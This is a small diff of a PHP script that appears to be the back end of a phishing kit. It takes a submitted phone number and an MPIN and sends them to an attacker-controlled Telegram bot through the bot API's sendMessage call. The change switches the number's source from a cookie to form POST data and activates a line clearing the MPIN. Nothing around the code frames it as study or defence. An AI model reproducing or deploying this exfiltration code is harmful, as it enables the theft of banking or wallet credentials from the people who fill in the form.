@@ -10,10 +10,9 @@ $mpin = NULL;
 
 $data = [
 'chat_id' => $Chat_ID,
-'text' => "Number: " . $_COOKIE['number'] . $mpin
+'text' => "Number: " . $_POST['number'] . $mpin
 ];
 file_get_contents("https://api.telegram.org/bot" . $Api_Token . "/sendMessage?" . http_build_query($data));
 
 // conmebt tgis
-
-//$_POST['mpin'] = NULL;
+$_POST['mpin'] = NULL;
